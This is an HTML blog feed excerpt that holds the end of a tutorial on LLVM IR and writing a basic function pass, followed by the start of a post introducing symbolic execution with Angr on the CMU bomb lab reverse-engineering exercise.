  <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">=</span> call i32 <span style="color:#960050;background-color:#1e0010">@</span>_Z3addii(i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>, i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>)
  <span style="color:#f92672">%</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> call i32 (i8<span style="color:#f92672">*</span>, ...) <span style="color:#960050;background-color:#1e0010">@</span>printf(i8<span style="color:#f92672">*</span> getelementptr inbounds ([<span style="color:#ae81ff">4</span> x i8], [<span style="color:#ae81ff">4</span> x i8]<span style="color:#f92672">*</span> <span style="color:#960050;background-color:#1e0010">@</span>.str<span style="color:#ae81ff">.1</span>, i64 <span style="color:#ae81ff">0</span>, i64 <span style="color:#ae81ff">0</span>), i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>)
  <span style="color:#f92672">%</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">=</span> call i32 <span style="color:#960050;background-color:#1e0010">@</span>_Z6addptrPiS_(i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>, i32<span style="color:#f92672">*</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>)
  <span style="color:#f92672">%</span><span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span> call i32 (i8<span style="color:#f92672">*</span>, ...) <span style="color:#960050;background-color:#1e0010">@</span>printf(i8<span style="color:#f92672">*</span> getelementptr inbounds ([<span style="color:#ae81ff">4</span> x i8], [<span style="color:#ae81ff">4</span> x i8]<span style="color:#f92672">*</span> <span style="color:#960050;background-color:#1e0010">@</span>.str<span style="color:#ae81ff">.1</span>, i64 <span style="color:#ae81ff">0</span>, i64 <span style="color:#ae81ff">0</span>), i32 <span style="color:#f92672">%</span><span style="color:#ae81ff">9</span>)
  ret i32 <span style="color:#ae81ff">0</span>
}

declare i32 <span style="color:#960050;background-color:#1e0010">@</span>printf(i8<span style="color:#f92672">*</span>, ...) <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">2</span>

attributes <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">=</span> { noinline nounwind optnone sspstrong uwtable <span style="color:#e6db74">&#34;correctly-rounded-divide-sqrt-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;disable-tail-calls&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;frame-pointer&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;all&#34;</span> <span style="color:#e6db74">&#34;less-precise-fpmad&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;min-legal-vector-width&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;no-infs-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-jump-tables&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-nans-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-signed-zeros-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-trapping-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;stack-protector-buffer-size&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span> <span style="color:#e6db74">&#34;target-cpu&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x86-64&#34;</span> <span style="color:#e6db74">&#34;target-features&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&#34;</span> <span style="color:#e6db74">&#34;unsafe-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;use-soft-float&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> }
attributes <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> { noinline norecurse optnone sspstrong uwtable <span style="color:#e6db74">&#34;correctly-rounded-divide-sqrt-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;disable-tail-calls&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;frame-pointer&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;all&#34;</span> <span style="color:#e6db74">&#34;less-precise-fpmad&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;min-legal-vector-width&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;no-infs-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-jump-tables&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-nans-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-signed-zeros-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-trapping-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;stack-protector-buffer-size&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span> <span style="color:#e6db74">&#34;target-cpu&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x86-64&#34;</span> <span style="color:#e6db74">&#34;target-features&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&#34;</span> <span style="color:#e6db74">&#34;unsafe-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;use-soft-float&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> }
attributes <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;correctly-rounded-divide-sqrt-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;disable-tail-calls&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;frame-pointer&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;all&#34;</span> <span style="color:#e6db74">&#34;less-precise-fpmad&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-infs-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-nans-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-signed-zeros-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;no-trapping-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;stack-protector-buffer-size&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span> <span style="color:#e6db74">&#34;target-cpu&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x86-64&#34;</span> <span style="color:#e6db74">&#34;target-features&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&#34;</span> <span style="color:#e6db74">&#34;unsafe-fp-math&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#e6db74">&#34;use-soft-float&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> }

<span style="color:#f92672">!</span>llvm.module.flags <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{<span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">2</span>}
<span style="color:#f92672">!</span>llvm.ident <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{<span style="color:#f92672">!</span><span style="color:#ae81ff">3</span>}

<span style="color:#f92672">!</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{i32 <span style="color:#ae81ff">1</span>, <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;wchar_size&#34;</span>, i32 <span style="color:#ae81ff">4</span>}
<span style="color:#f92672">!</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{i32 <span style="color:#ae81ff">7</span>, <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;PIC Level&#34;</span>, i32 <span style="color:#ae81ff">2</span>}
<span style="color:#f92672">!</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{i32 <span style="color:#ae81ff">7</span>, <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;PIE Level&#34;</span>, i32 <span style="color:#ae81ff">2</span>}
<span style="color:#f92672">!</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>{<span style="color:#f92672">!</span><span style="color:#e6db74">&#34;clang version 10.0.0 &#34;</span>}
</code></pre></div><p>The bitcode comes out gibberish, as expected, so I&rsquo;m not going to show the output of that here.</p>
<p>Focusing on the IR of the source and ignoring all the meta data, we can see that an almost C like, straight up readable.</p>
<p>The <code>main</code> function exists right in the middle of the output.</p>
<ul>
<li>Defined with a return type <code>i32</code>, which is quite clearly, a 32-bit int. It&rsquo;s not used much, except as the return values of system calls such as <code>printf</code>, <code>scanf</code> and <code>main</code>.</li>
<li>The <code>alloca</code> instruction allocated memory on the stack, with an <em>align</em> parameter to align the allocation on a boundary.</li>
<li>The <code>getelementptr</code> instruction gets the address of a subelement of an aggregates data structure(such as arrays and structs). It just calculates the address, which is then passed on as parameters to function calls.</li>
</ul>
<p>We can see three function calls, two to <code>printf</code> and one to <code>_Z3addii</code>. The first one is pretty clear but the second one seems like the name we used in the source code has been morphed. It has undergone mangling by the compiler. <strong>Name Mangling</strong> is the process of adding additional information to the name of a function so as to make sure two separate functions do not end up having the same name in the same namespace, causing a conflict. It&rsquo;s only done when two functions with same name exist when a C source file is being compiled, but it&rsquo;s always applied when a C++ source file is being compiled.</p>
<p>The <code>add</code> function we defined isn&rsquo;t that complicated either. It performs <strong>pass by value</strong>.</p>
<ul>
<li>Uses the <code>alloca</code> instruction to allocate stack space for two integers.</li>
<li>Uses the <code>store</code> instruction to map the value of the parameters we passed to the function onto the memory freshly allocated.</li>
<li>The <code>i32*</code>s are the references( to the integers.</li>
<li>Uses the load instruction to load the value of the parameters from the memory into local variables.</li>
<li>Uses the <code>add nsw</code> instruction to add the two variables with a No Signed Wrap property(signed integers won&rsquo;t be wrapped around in case of an overflow during arithmetic operation).</li>
</ul>
<p>The <code>addptr</code> function performs <strong>pass by pointers</strong>.</p>
<ul>
<li>Same as before mostly except the extra instructions because of the use of pointers. The variables get the references to the arguments(which are addresses) passed.</li>
<li>These variables are then stored onto the stack.</li>
<li>The <code>i32**</code>s are the addresses.</li>
<li>The four load instructions can be seen to dereferences values stored at the given addresses into integer variables.</li>
<li>The addition is then performed on these integers and the result returned.</li>
</ul>
<h1 id="instrumentation">Instrumentation</h1>
<p>We&rsquo;ll create a simple C++ program to instrument. </p>
<p>Since printing statements is a cliché now, we&rsquo;ll do something different. Let&rsquo;s find loops and predict their number of iterations. It&rsquo;s a rudimentary approach full of loop holes, but works for naïve programs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// loop.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
using namespace std;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">looper0</span>(<span style="color:#66d9ef">int</span> low, <span style="color:#66d9ef">int</span> high) {
    <span style="color:#66d9ef">int</span> i, sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> low; i <span style="color:#f92672">&lt;</span> high; i<span style="color:#f92672">++</span>)
        sum <span style="color:#f92672">+=</span> i;
    <span style="color:#66d9ef">return</span> sum;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">looper1</span>(<span style="color:#66d9ef">int</span> low, <span style="color:#66d9ef">int</span> high) {
    <span style="color:#66d9ef">int</span> i, sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> low; i <span style="color:#f92672">&lt;</span> high; i<span style="color:#f92672">++</span>)
        sum <span style="color:#f92672">+=</span> i;
    <span style="color:#66d9ef">return</span> sum;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">int</span> sum;
    
    sum <span style="color:#f92672">=</span> looper0(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    sum <span style="color:#f92672">+=</span> looper1(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    sum <span style="color:#f92672">+=</span> looper0(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    
    std<span style="color:#f92672">::</span>cout<span style="color:#f92672">&lt;&lt;</span>sum<span style="color:#f92672">&lt;&lt;</span>endl;
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Compile the file to IR by executing <code>clang++ -S -emit-llvm loop.cpp</code>.</p>
<p>Make a directory named <em>CUSTOM_DIR</em> inside <em>PATH/llvm-project/llvm/lib/Transforms/</em>,    where PATH is the path of the folder where LLVM repository was cloned.</p>
<p>Let&rsquo;s write a function pass to collect the target stats. Make a file inside the newly formed folder. Let&rsquo;s say it&rsquo;s named <em>CUSTOM_PASS.cpp</em>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// CUSTOM_PASS.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// PART 1
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;llvm/IR/Function.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;llvm/Pass.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;llvm/Support/raw_ostream.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// PART 2
</span><span style="color:#75715e"></span>using namespace llvm;

namespace {

  <span style="color:#75715e">// PART 3
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> PASS_NAME : public FunctionPass {
  
  	<span style="color:#75715e">// PART 4
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> ID; <span style="color:#75715e">// Pass identification, replacement for typeid
</span><span style="color:#75715e"></span>    PASS_NAME() <span style="color:#f92672">:</span> FunctionPass(ID) {}

	<span style="color:#75715e">// PART 5
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">bool</span> runOnFunction(Function <span style="color:#f92672">&amp;</span>F) override {
      <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> basicBlockCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> instructionCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

      <span style="color:#66d9ef">for</span>(BasicBlock <span style="color:#f92672">&amp;</span>bb : F) {
        <span style="color:#f92672">++</span>basicBlockCount;
        <span style="color:#66d9ef">for</span>(Instruction <span style="color:#f92672">&amp;</span>i: bb){
          <span style="color:#f92672">++</span>instructionCount;
        }
      }

      errs() <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function Name: &#34;</span>;
      errs().write_escaped(F.getName()) <span style="color:#f92672">&lt;&lt;</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">   &#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Basic Blocks: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> basicBlockCount
                                        <span style="color:#f92672">&lt;&lt;</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">   &#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Instructions: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> instructionCount <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
      <span style="color:#66d9ef">return</span> false;
    }
  };
}

<span style="color:#75715e">// PART 6
</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> PASS_NAME<span style="color:#f92672">::</span>ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

<span style="color:#75715e">// PART 7
</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> RegisterPass<span style="color:#f92672">&lt;</span>PASS_NAME<span style="color:#f92672">&gt;</span> X(<span style="color:#e6db74">&#34;PASS_NAME&#34;</span>, <span style="color:#e6db74">&#34;Custom Pass&#34;</span>);
</code></pre></div><ul>
<li>PART 1: The <em>include</em> statements. We include those particular header files because we&rsquo;re writing a <em>Pass</em>, on each <em>Function</em>, and we&rsquo;ll be printing the stats.</li>
<li>PART 2: Declares the <em>namespace</em>. It is necessary since everything defined in the header files are in the llvm namespace. And then we start with an anonymous namespace block.</li>
<li>PART 3: Declares our pass named <em>PASS_NAME</em>. Declares a subclass for the parent class named <em>FunctionPass</em>, which operates on every function defined.</li>
<li>PART 4: Declares a unique pass identifier which is used by LLVM to identify the pass.</li>
<li>PART 5: We overwrite the <em>runOnFunction</em> method from the parent class and write our code for instrumentation. The return value is the answer to the question “Does this code modify the original source code?”. If it does, return <em>true</em>, else return <em>false</em>.</li>
<li>PART 6: The <em>ID</em> to our pass <em>PASS_NAME</em> is initialized.</li>
<li>PART 7: Register the subclass we just created. The first argument is the name of the parameter we will provide to choose this pass, and the second argument is the name of the pass.</li>
</ul>
<p>Add a file named <strong>CMakeLists.txt</strong> to the same folder with the following content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">add_llvm_library<span style="color:#f92672">(</span> LLVMCUSTOM_PASS MODULE
  CUSTOM_PASS.cpp

  PLUGIN_TOOL
  opt
  <span style="color:#f92672">)</span>
</code></pre></div><p>The name <em>LLVMCustomPass</em> is the name of the module(shared object) that will be created on ‘making’ it, should be changed as wanted.</p>
<p>The name CustomPass.cpp is the name of the source code file, should be changed according to what the name of the source file for your pass is.</p>
<p>Add this folder to the <em>PATH/llvm-project/llvm/lib/Transforms/CMakeLists.txt</em>, that is, the <em>CMakeLists.txt</em> file that exists in our newly created directory&rsquo;s parent directory. This ensures that our new directory will be taken into account while building the binaries and the libraries next time.</p>
<pre><code>add_subdirectory(CUSTOM_DIR)
</code></pre><p>Then run <code>make</code> from <em>PATH/llvm-project/build/</em>.</p>
<p>You&rsquo;ll see that a new file, <em>PATH/llvm-project/build/lib/LLVMCUSTOM_PASS.so</em> has been created. This is the module we&rsquo;ll use to instrument our target source code.</p>
<p>Run <code>PATH/llvm-project/llvm/build/bin/opt -load PATH/llvm-project/build/lib/LLVMCUSTOM_PASS.so -PASS_NAME &lt; loop.ll</code> to see the output from the instrumentation.</p>
<ul>
<li><code>PATH/llvm-project/llvm/build/bin/opt</code> calls the aforementioned opt tool.</li>
<li>-load is the parameter to provide the instrumentation module.</li>
<li><code>PATH/llvm-project/build/lib/LLVMCUSTOM_PASS.so</code> is the instrumentation module we built.</li>
<li><code>-PASS_NAME</code> is passed to ascertain the particular pass to be used.</li>
<li><code>&lt;</code> is used to redirect input from a file.</li>
<li><code>loop.ll</code> is the file with the assembly formatted IR.</li>
</ul>
<p>The output from the instrumentation module is as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Function Name: __cxx_global_var_init
   Basic Blocks: <span style="color:#ae81ff">1</span>
   Instructions: <span style="color:#ae81ff">3</span>
Function Name: _Z7looper0ii
   Basic Blocks: <span style="color:#ae81ff">5</span>
   Instructions: <span style="color:#ae81ff">25</span>
Function Name: _Z7looper1ii
   Basic Blocks: <span style="color:#ae81ff">5</span>
   Instructions: <span style="color:#ae81ff">25</span>
Function Name: main
   Basic Blocks: <span style="color:#ae81ff">1</span>
   Instructions: <span style="color:#ae81ff">17</span>
Function Name: _GLOBAL__sub_I_calc.cpp
   Basic Blocks: <span style="color:#ae81ff">1</span>
   Instructions: <span style="color:#ae81ff">2</span>
</code></pre></div><p>And there we go. We get our stats on the basic blocks and instructions that exist in the IR assembly.</p>
<p>To verify, we&rsquo;ll have to take a look at the call graphs of the functions.</p>
<p>To generate the CFGs, run <code>PATH/llvm-project/llvm/build/bin/opt -dot-cfg loop.bc</code>. This will generate multiple <em>dot files</em> by the name of the functions. Use a utility like <strong>xdot</strong> or dotty to view them.</p>
<p>As an example, let&rsquo;s checkout the CFG for the function <code>_Z7looper0ii</code>.</p>
<p><img src="/Source_Code_Instrumentation_and_LLVM/2020-06-25-031857-screenshot.png" alt="&ldquo;CFG&rdquo;">
<em>CFG for the looper0 function.</em></p>
<p>Counting the number of basic blocks and instructions, the output from our instrumentation checks out.</p>
<p>Credits for the guidance to</p>
]]></content>
        </item>
        
        <item>
            <title>Symbolic Execution and Angr</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/21/symbolic-execution-and-angr/</link>
            <pubDate>Thu, 21 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/21/symbolic-execution-and-angr/</guid>
            <description>Symbolic Execution is mainly focused on converting a program made up of a concrete set of instructions into an equation-like format. This is achieved with two core components:
Symbols Different values in a program(such as the user input) are substituted with Symbols(variables or placeholders). These symbols pertain to a domain full of values, allowing us to explore the program in a much more open form, basically “walking through the program” with a domain full of values(handled by any one of the constraint solving backends like Z3) instead of walking a fixed path due to a fixed hard-coded value/input.</description>
            <content type="html"><![CDATA[<p><strong>Symbolic Execution</strong> is mainly focused on converting a program made up of a concrete set of instructions into an equation-like format. This is achieved with two core components:</p>
<h3 id="symbols">Symbols</h3>
<p>Different values in a program(such as the user input) are substituted with <strong>Symbols</strong>(variables or placeholders). These symbols pertain to a domain full of values, allowing us to explore the program in a much more open form, basically “walking through the program” with a domain full of values(handled by any one of the constraint solving backends like Z3) instead of walking a fixed path due to a fixed hard-coded value/input.</p>
<h3 id="execution-paths">Execution Paths</h3>
<p>The phrase “walking through the program” essentially means carrying out the set of instructions in the program. These set of instructions define a particular path, which when executed, brings the execution flow of the program to a particular state, unique to that path. An execution path, therefore, represents a possible execution of the program that begins somewhere and ends somewhere else.</p>
<p>Checkout the <a href="https://blog.notso.pro/downloads/SymbolicExecution.pdf">slides</a> for a practical viewpoint over symbolic execution.</p>
<p>From a practical view point, the ability to reason (solve) large boolean functions makes symbolic execution possible. Programs and instructions are converted into formulae, and then these formulae are reasoned with to see if a particular path of execution is possible. However, testing all the paths of a binary can be cumbersome since the number of paths grow exponentially. Therefore, we solve problems that have a certain structure to them instead of completely random stuff such as random bitvectors or integers. We imply such techniques on something that one is confident about, so symbolic execution coming out to be undecidable or an ETA of time as large as the age of universe(literally) is pretty infrequent, although it does happen.</p>
<p>Moreover, exponential path growth kept aside, one must consider the fact that each of these paths have exponentially growing inputs, which would take even longer. Therefore, the fact that we are fuzzing with a focus on paths rather than the user input itself makes sure we are better off.</p>
<p>Another thing to consider is that a strategy often used at a branch is to take both branches, collect their respective events and merge in the end to make sure everything works fine. But that doesn&rsquo;t work well with modern, huge programs. So we usually prefer to do “one path at a time exploration”. that is, take a path, create a formula for it and find an input for it with a particular aim in mind such as satisfying some constraint, violating a property or causing a crash with an out of bounds err. If  this path doesn&rsquo;t achieve the aim, we try out a different path.</p>
<p>The strategy of approach is chosen between “path by path” reasoning, “all paths at same time” reasoning or a set of heuristics to make a search traceable(pruning paths early in control flow graphs depending on their end result) would not necessarily make a huge difference to the outcome, but can make a huge difference to the efficiency of resources. Thus, an intelligible decision should be made to prevent path explosion. Some sort of random testing is done to explore initial set of paths, and the we can start looking at the paths in the neighborhood.</p>
<h2 id="angr">Angr</h2>
<p>I would highly recommend reading through the <a href="http://docs.angr.io/">Angr docs</a> for a comprehensive surface-level understanding of different classes and methods supported by Angr, with their usecases, as well as reading <a href="https://blog.notso.pro/2019-03-20-angr-introduction-part0/">Federico Lagrasta’s intorductory series on Angr</a>.</p>
<p>Now, I&rsquo;d be amiss if I didn&rsquo;t highlight the fact that while Angr manages to be a stroke of brilliance, it isn&rsquo;t that tough. It&rsquo;s the lack of resources that proves to be overwhelming, especially with so many version changes. There are a lot of writeups you could read through, but that doesn&rsquo;t help much from an absolute beginner&rsquo;s point of view. Therefore, I intend to solve the CMU bomb binaries in order to learn Angr, and will be documenting the journey in the hopes that it would probably be useful to someone, someday.</p>
<p>View the <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Fuzzing%20and%20Symbolic%20Execution.pptx">PPT</a> for a quick intro to Symbolic Execution.</p>
<h2 id="x64-cmu-bomb-lab">x64 CMU Bomb Lab</h2>
<p>There are a bunch of different <em>phases</em>(read: levels) that we&rsquo;ll have to solve.</p>
<p>The binary looks as follows:</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-051114_1920x1080_scrot.png" alt="&ldquo;main&rdquo;">
<em>Disassembly of the important part of the main function (a handy reference for addresses).</em></p>
<p>It tells us: </p>
<ul>
<li>The binary just calls a bunch of different functions sequentially, and we gotta pass through them all to be able to successfully defuse the bomb.</li>
<li>A value is returned from the function <code>read_line</code>. Going by the calling convention of x86_64, a function returns a value using the <code>RAX</code> register. Thus the <code>input</code> variable gets the value returned from the function.</li>
<li>Going by the calling convention of x86_64, a function&rsquo;s first argument is passed via the <code>RDI</code> register. Thus, the value returned from the <code>read_line</code> function is passed onto the next phase function every time.</li>
</ul>
<p><img src="/Symbolic_Execution_and_Angr/1_2020-06-06-003407_1920x1080_scrot.png" alt="&ldquo;read_line&rdquo;">
<em>Disassembly of the read_line function.</em></p>
<p>Taking a look at the <code>read_line</code> function&rsquo;s ending code blocks, it can be seen that a particular comparison with <code>78</code> (decimal value) gives rise to branches - one with an error (saying that the input is too long), while the other one returns. It can be easily deduced that the user input seems to be limited to 78 characters, and it is the value which is returned.</p>
<p>We&rsquo;ll take two approaches for each phase:</p>
<h5 id="approach-1-blind-walk">Approach 1: Blind Walk</h5>
<p>We&rsquo;ll let Angr do what it does best: walk all over the binary without any care in the world. We treat the function as a black box and do not look into it&rsquo;s working. We just let Angr do it&rsquo;s work. This does take a lot of time, as a result of which, I didn&rsquo;t use it after the first phase.</p>
<h5 id="approach-2-targeted-walk">Approach 2: Targeted Walk</h5>
<p>This approach is a more targeted approach based on our knowledge of the inside workings of the function. The main focus here is to find out how the user input and the values to be compared are provided to the function, and then applying a tailored method to exact this comparison value.</p>
<h3 id="phase-1">Phase 1</h3>
<p>Function: <code>phase_1</code></p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-144000_1920x1080_scrot.png" alt="&ldquo;phase_1&rdquo;">
<em>Disassembly of the phase_1 function.</em></p>
<p>From the disassembly, we can see that following the calling convention goes, an address is being moved into the <code>ESI</code> register. </p>
<p><img src="/Symbolic_Execution_and_Angr/1_2020-06-04-152129_1920x1080_scrot.png" alt="&ldquo;strings_not_equal&rdquo;">
<em>Disassembly of the strings_not_equal function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>The values stored in both, the <code>RSI</code> and the <code>RDI</code> registers are moved to <code>RBX</code> and <code>RBP</code> in the top left block.</li>
<li>A loop construct is present in the bottom right blocks where value from <code>RBX</code> is moved to <code>EAX</code> byte-by-byte and then <code>RBP</code> and <code>AL</code> are compared.
<ul>
<li>This can be deduced as a string comparison.</li>
</ul>
</li>
</ul>
<p>Thus, it can be conclusively said that the address, which was moved into the <code>ESI</code> register earlier, is the address of the string to which the user input is compared.</p>
<p>Therefore,</p>
<ul>
<li>User input: <code>RDI</code> register</li>
<li>Comparison value: string&rsquo;s address in <code>ESI</code> register</li>
</ul>
